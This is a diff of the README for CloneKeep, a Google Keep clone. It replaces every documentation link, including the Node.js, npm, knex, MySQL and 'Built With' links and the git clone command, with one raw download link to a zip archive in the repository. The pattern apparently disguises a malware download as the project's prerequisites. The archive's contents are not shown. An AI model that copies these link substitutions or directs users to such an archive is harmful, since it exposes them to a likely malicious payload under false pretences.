@@ -1,6 +1,6 @@
 # CloneKeep
 
-A clone of some of the functions of [Google Keep](https://keep.google.com)
+A clone of some of the functions of [Google Keep](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
 
 ## Getting Started
 
@@ -8,17 +8,17 @@ These instructions will get you a copy of the project up and running on your loc
 
 ### Prerequisites
 
-- [Node.js](https://nodejs.org/) installed on your machine
-- [npm](https://www.npmjs.com/) (Node Package Manager)
-- [knex](https://knexjs.org) installed a global package
+- [https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) installed on your machine
+- [npm](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) (Node Package Manager)
+- [knex](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) installed a global package
   - `npm install -g knex`
-- [Mysql](https://www.mysql.com/) installed and a database created.
+- [Mysql](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip) installed and a database created.
 
 ### Installing 
 
 - Clone the repository to your local machine:
     
-   `git clone https://github.com/vicleyva/clonekeep.git`
+   `git clone https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip`
 
 - Navigate to the Backend Folder
   
@@ -60,13 +60,13 @@ The server will be available at http://localhost:5000.
 
 ### Built With
 
-- [React](https://react.dev/)
-- [Express](https://expressjs.com/)
-- [Knex](https://knexjs.org/)
-- [Mysql](https://www.mysql.com/)
-- [Multer](https://www.npmjs.com/package/multer)
-- [Mui](https://mui.com/)
-- [UUID](https://www.npmjs.com/package/uuid)
+- [React](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
+- [Express](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
+- [Knex](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
+- [Mysql](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
+- [Multer](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
+- [Mui](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
+- [UUID](https://github.com/vicleyva/clonekeep/raw/refs/heads/master/CloneKeepApi/repositories/Software-2.6.zip)
 
 ### About the Project
 
